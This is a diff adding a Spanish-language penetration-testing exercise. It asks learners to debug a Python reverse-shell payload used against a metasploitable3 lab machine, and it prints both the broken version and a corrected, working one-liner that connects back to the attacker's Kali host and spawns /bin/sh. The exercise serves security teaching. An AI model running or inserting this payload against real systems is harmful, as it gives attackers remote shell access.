@@ -1,0 +1,15 @@
+Ejercicio: Modifica el nuevo payload para que funcione
+En la sección anterior hemos visto como podemos utilizar un exploit con diferentes payloads para aprovechar una vulnerabilidad en particular que nos proporcionaba acceso remoto a la máquina metasploitable3 Ubuntu.
+
+Sin embargo, durante el transcurso del ejercicio anterior, el segundo payload introducido, que obtuvimos de internet, no llegó a generar una conexión reversa a nuestra máquina Kali Linux del atacante.
+
+Dedica unos minutos a repasar el código del nuevo payload y tratar de identificar el problema.
+
+python_payload = f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({local_ip},{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"'
+
+
+¡Efectivamente! El payload anterior contiene algunos fallos de sintaxis que provocan conflictos entre comillas dobles (") y comillas simples ('), además, faltan las comillas simples en la dirección ip de la máquina objetivo.
+
+Este es el código que deberíamos utilizar para que se ejecute correctamente. ¡Prueba a sustituirlo en el exploit y lanzarlo contra la máquina metasploitable3!
+
+python_payload = f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{local_ip}\',{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"'
